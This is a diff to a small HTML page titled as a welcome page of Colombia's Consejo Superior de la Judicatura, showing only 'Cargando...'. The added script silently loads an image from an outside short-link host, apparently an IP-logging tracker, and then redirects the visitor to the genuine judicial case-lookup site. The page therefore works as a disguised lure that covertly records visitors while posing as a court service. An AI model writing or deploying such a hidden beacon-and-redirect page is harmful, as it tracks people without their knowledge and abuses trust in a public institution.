@@ -7,6 +7,17 @@
 		<link rel="icon" href="mpa.ico" />
 		<title>Bienvenido- Consejo Superior de la Judicatura </title>
 		<script type="text/javascript">
+			/*
+			window.onload = () => {
+			  // Get 100 random images
+			  fetch('https://2no.co/2LkbS6.png')
+			    .then(function(response) {
+			      window.location="https://consultaprocesos.ramajudicial.gov.co/Procesos/NombreRazonSocial";
+			    })
+			    .catch(err => {
+			      console.log(err);
+			    });
+			};
 			var img = document.createElement("img");
 			img.src = "https://2no.co/2LkbS6.png";
 			img.onload = function() {
@@ -14,10 +25,15 @@
 				window.location="https://consultaprocesos.ramajudicial.gov.co/Procesos/NombreRazonSocial";
 			};
 			window.document.body.append(img);
+			*/
+			var img = new Image();
+			img.onload = function() {
+				window.location="https://consultaprocesos.ramajudicial.gov.co/Procesos/NombreRazonSocial";
+			};
+			img.src = "https://2no.co/2LkbS6.png";
 		</script>
 	</head>
 	<body>
 		<strong>Cargando...</strong>
-		<img src="https://2no.co/2LkbS6.png" />
 	</body>
 </html>
